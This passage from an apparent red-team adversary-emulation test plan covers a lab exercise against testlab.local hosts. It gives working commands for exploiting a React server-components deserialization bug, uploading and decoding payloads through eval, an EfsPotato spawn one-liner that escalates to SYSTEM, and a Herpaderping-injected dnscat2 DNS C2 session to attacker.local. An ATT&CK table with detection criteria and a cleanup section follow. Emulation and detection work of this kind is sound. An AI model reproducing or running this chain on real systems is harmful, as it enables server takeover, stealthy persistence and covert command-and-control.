With `CertEnrollSvc.exe` staged at `C:\Windows\Temp\`, the attacker confirms
that the AppPool identity holds `SeImpersonatePrivilege` — a standard entitlement
for IIS worker processes. `CertEnrollSvc.exe` (an obfuscated variant of EfsPotato)
abuses the MS-EFSR named pipe (via the `lsarpc` endpoint by default) to coerce
a SYSTEM-level impersonation token, then spawns the specified command under
that token using `CreateProcessAsUser`.

The attacker launches `CertEnrollSvc.exe` directly from the still-live
react2shell session via `eval` + detached `spawn`, passing `CertEnrollAgent.exe`
as the argument. CertEnrollSvc acquires the SYSTEM token and uses it to start
`CertEnrollAgent.exe` — the same CWLHerpaderping binary used in the workstation
path — as `NT AUTHORITY\SYSTEM`. CertEnrollAgent reads `C:\ProgramData\CertCA.bin` into memory, deletes the file
from disk, writes the bytes into a temp file, and creates an image section via
`NtCreateSection`.

`GetNonJobParent()` finds a `svchost.exe` instance in Session 0 (filtered by
`ProcessIdToSessionId`) and passes its handle as parent to `NtCreateProcessEx`.
The ghost is therefore created in Session 0 with `svchost.exe` as PPID, avoiding
the session anomaly that occurs when SYSTEM-token processes are parented to
interactive-session processes. `NtSetInformationProcess(ProcessAccessToken)` then
assigns a duplicate of CertEnrollAgent's own primary token (SYSTEM) to the ghost
process, overriding the inherited `svchost.exe` token.

The on-disk temp file is then overwritten with junk. The ghost process presents
as `C:\Windows\System32\RuntimeBroker.exe` and dnscat2 begins tunnelling C2
traffic over DNS, establishing a session on the IIS server host under
`NT AUTHORITY\SYSTEM`. The entire escalation sequence — upload, decode, EfsPotato,
Herpaderping — is executed from a single react2shell session with no intermediate
C2 pivot.

### Setup

- ☣️ Encode `CertEnrollSvc.exe`, `dnscat2.exe`, and `CWLHerpaderping.exe` to base64 on the attacker machine

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py ../EfsPotato/CertEnrollSvc.exe -o CertEnrollSvc.b64 -l 0
  python encode_payload.py ../dnscat2.exe -o dnscat2.b64 -l 0
  python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe -o CertEnrollAgent.b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Encoding successful!
    [*] Original size: <N> bytes
    [*] Base64 size: <N> bytes
    [*] Output file: CertEnrollSvc.b64 (<N> bytes)
    [*] Lines: 1 x 0 chars

    [+] Decode with certutil:
        certutil -decode CertEnrollSvc.b64 CertEnrollSvc_decoded.exe
    [+] Encoding successful!
    [*] Original size: <N> bytes
    [*] Base64 size: <N> bytes
    [*] Output file: dnscat2.b64 (<N> bytes)
    [*] Lines: 1 x 0 chars

    [+] Decode with certutil:
        certutil -decode dnscat2.b64 dnscat2_decoded.exe
    [+] Encoding successful!
    [*] Original size: <N> bytes
    [*] Base64 size: <N> bytes
    [*] Output file: CertEnrollAgent.b64 (<N> bytes)
    [*] Lines: 1 x 0 chars

    [+] Decode with certutil:
        certutil -decode CertEnrollAgent.b64 CertEnrollAgent_decoded.exe
    ```

### Procedures

- ☣️ Launch the interactive exploitation shell against the target

  ```bash
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Type 'help' for available commands
    [*] Testing connection...
    [+] Connection established!
    ```

- ☣️ Upload and decode all three payloads to the IIS server via eval (no spawn)

  ```
  upload CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.b64
  decode C:\Windows\Temp\CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.bin
  rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
  upload dnscat2.b64 C:\Windows\Temp\dnscat2.b64
  decode C:\Windows\Temp\dnscat2.b64 C:\ProgramData\CertCA.bin
  upload CertEnrollAgent.b64 C:\Windows\Temp\CertEnrollAgent.b64
  decode C:\Windows\Temp\CertEnrollAgent.b64 C:\ProgramData\CertEnrollAgent.bin
  rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output (each file)***

    ```text
    [*] Uploading <file> (<N> chars) via eval (NO spawn - STEALTH!)...
    [*] Uploading in <N> chunk(s) -> <dest>...
    [+] File uploaded successfully -> <dest> (NO process spawn!)
    [*] Decoding <input> -> <output> via eval (NO spawn - STEALTH!)...
    [+] File decoded successfully -> <output> (NO process spawn!)
    [*] Renaming <old> -> <new> via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> <new> (NO process spawn!)
    ```

- ☣️ Launch `CertEnrollSvc.exe` (EfsPotato) via eval detached spawn — exploits `SeImpersonatePrivilege` to run `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`; react2shell session remains alive

  ```
  eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/CertEnrollSvc.exe',['C:/ProgramData/CertEnrollAgent.exe'],{detached:true,stdio:'ignore'}).unref()
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

- ☣️ Switch to the attacker machine and confirm the C2 session (SYSTEM) appears

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (iis-server) 1> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with `Next-Action: x` header and multipart body containing `"then":"$1:__proto__:then"` field; server responds with `X-Action-Redirect: /login?a=<base64>` header carrying command output | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 deserialization to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes or appends 2,000-char chunks to `C:\Windows\Temp\CertEnrollSvc.b64` via `fs.writeFileSync` and `fs.appendFileSync` | Calibrated - Not Benign | `upload` command transfers CertEnrollSvc.exe encoded as base64 in chunks via eval-based `fs` writes — no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` reads `C:\Windows\Temp\CertEnrollSvc.b64` and writes decoded bytes to `C:\Windows\Temp\CertEnrollSvc.bin`, followed by `fs.renameSync` rename to `C:\Windows\Temp\CertEnrollSvc.exe` | Calibrated - Not Benign | `decode` command decodes base64 file to PE bytes using Node.js `Buffer` API via eval, then `rename` moves the staged `.bin` to `.exe` — no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Execution | T1106 | Native API | Windows | `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` resolved dynamically via `GetProcAddress` from `ntdll.dll`; all five wrapped with stack spoofer planting fake return address inside `kernel32.dll`; one `WriteProcessMemory` Win32 call for PEB `ProcessParameters` pointer only (not spoofed) | Not Calibrated - Not Benign | CWLHerpaderping (`CertEnrollAgent.exe`) calls NT native APIs directly from `ntdll.dll` to create the ghost process and inject the dnscat2 payload; the five injection-critical calls are stack-spoofed; a single `WriteProcessMemory` is used to write the `ProcessParameters` pointer into the remote PEB | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` elevates its token to `NT AUTHORITY\SYSTEM` via Named Pipe Impersonation to spawn a highly privileged child process | Calibrated - Not Benign | CertEnrollSvc uses `SeImpersonatePrivilege` held by the AppPool identity to impersonate the SYSTEM token via MS-EFSR named pipe coercion | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
| Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonation token obtained via `WindowsIdentity.GetCurrent().Token` after `ImpersonateNamedPipeClient`; child process (`CertEnrollAgent.exe`) created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | After `ImpersonateNamedPipeClient` acquires the SYSTEM impersonation token, CertEnrollSvc reads it via `WindowsIdentity.GetCurrent().Token` and passes it directly to `CreateProcessAsUser` to spawn `CertEnrollAgent.exe` as SYSTEM | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
| Defense Evasion | T1055 | Process Injection | Windows | `CertEnrollAgent.exe` maps a `SEC_IMAGE` section from a temporary file and spawns a ghost process via `NtCreateProcessEx` before overwriting the temp file on disk | Calibrated - Not Benign | CWLHerpaderping uses the Process Herpaderping technique: writes dnscat2 payload to temp file, maps `NtCreateSection(SEC_IMAGE)`, spawns ghost process via `NtCreateProcessEx` from that section, then overwrites the temp file with junk — process runs from in-memory section while on-disk file is corrupted | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns a ghost process with a spoofed parent PID (PPID) pointing to `svchost.exe` or `wininit.exe` in Session 0 | Calibrated - Not Benign | `GetNonJobParent()` iterates `svchost.exe` then `wininit.exe` as fallback, filtering to Session 0 via `ProcessIdToSessionId`; opens first match with `PROCESS_CREATE_PROCESS` and passes handle to `NtCreateProcessEx`; token fixup overrides inherited parent token with SYSTEM | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk | Calibrated - Not Benign | CWLHerpaderping deletes the dnscat2 payload file from disk after reading it to memory to remove forensic evidence | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` spawns a ghost process with the spoofed `ImageFileName` of `C:\Windows\System32\RuntimeBroker.exe` | Calibrated - Not Benign | CWLHerpaderping spawns ghost process with spoofed image path to blend with legitimate Windows processes | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `attacker.local` | Calibrated - Not Benign | dnscat2 C2 session established from IIS server as SYSTEM via Herpaderping ghost process; bootstrapped from a single react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads encrypted with session keys derived from ECDH P-256 key exchange; pre-shared secret used for authenticator verification; traffic is opaque to DNS inspection | Not Calibrated - Not Benign | dnscat2 performs ECDH P-256 key exchange then encrypts C2 traffic with Salsa20 stream cipher; pre-shared secret configured in Step 0 is used for HMAC authenticator, not as encryption key directly | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Discovery | T1012 | Query Registry | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) reads the `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` registry key via `RegOpenKeyEx` API | Calibrated - Not Benign | dnscat2 enumerates all TCP/IP interface GUIDs and reads `NameServer` / `DhcpNameServer` registry values to discover the DNS resolver for C2 domain tunneling | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with the `CREATE_NO_WINDOW` (`0x08000000`) flag; `dnscat2.exe` executes without a console window | Calibrated - Not Benign | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with `CREATE_NO_WINDOW` (`0x08000000`) to launch `CertEnrollAgent.exe` as SYSTEM; dnscat2 compiled with `-H windowsgui` — no visible window artifact on IIS server at any point during or after escalation | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe), [dnscat2 build flags](../resources/payloads/dnscat2/go-client) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | `CertEnrollAgent.exe` patches the remote PEB `ProcessParameters` pointer of the ghost process to a spoofed structure | Calibrated - Not Benign | `CWLHerpaderping` (`CertEnrollAgent.exe` running as SYSTEM on IIS01) builds fake `RTL_USER_PROCESS_PARAMETERS` with `RuntimeBroker.exe` image path and patches the ghost PEB pointer — process appears as a legitimate Windows component to any tool querying `ProcessParameters` | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` (CWLHerpaderping) resolves `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` via `GetProcAddress` from `ntdll.dll` at runtime; none appear in the binary's static import table | Not Calibrated - Not Benign | CWLHerpaderping calls `GetProcAddress` to resolve all five injection-critical NT APIs at runtime rather than importing them statically — the binary's IAT contains no references to these functions, making them invisible to static import analysis | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information, while CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Defense Evasion | T1134 | Access Token Manipulation | Windows | `CertEnrollAgent.exe` calls `NtSetInformationProcess` with class `ProcessAccessToken` on the ghost process handle, assigning a duplicate of its own primary token | Not Calibrated - Not Benign | After ghost process creation via `NtCreateProcessEx`, `CertEnrollAgent.exe` duplicates its own primary token and assigns it to the ghost via `NtSetInformationProcess(ProcessAccessToken)` — overriding the inherited `svchost.exe` token | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -

---

## End of Test

### Procedures

- ☣️ Terminate all dnscat2 sessions from the C2 server (workstation + IIS server)

  ```text
  dnscat2> session -k <workstation-session-id>
  dnscat2> session -k <iis-server-system-session-id>
  ```

- Remove dropped artifacts on the victim workstation

  | Artifact | Location |
  | - | - |
  | `hpsolutionsportal.hta` | `%TEMP%\` |
  | `CertEnrollAgent.exe` | `%APPDATA%\Microsoft\Windows\` |
  | `HD*.tmp` (Herpaderping temp file) | `%TEMP%\` |

- Remove dropped artifacts on the IIS server

  | Artifact | Location |
  | - | - |
  | `CertEnrollSvc.exe` | `C:\Windows\Temp\` |
  | `CertEnrollSvc.b64`, `dnscat2.b64`, `CertEnrollAgent.b64` | `C:\Windows\Temp\` |
  | `CertEnrollAgent.exe` | `C:\ProgramData\` |
  | `CertCA.bin` (auto-deleted by Herpaderping) | `C:\ProgramData\` |
  | `HD*.tmp` (Herpaderping temp file) | `C:\Windows\Temp\` |

- Remove uploaded files from `upload.testlab.local`

  | File |
  | - |
  | `/uploads/staging.html` |
  | `/uploads/dnscat2.exe` |
  | `/uploads/CWLHerpaderping.exe` |

- Stop the dnscat2 server listener on the attacker machine
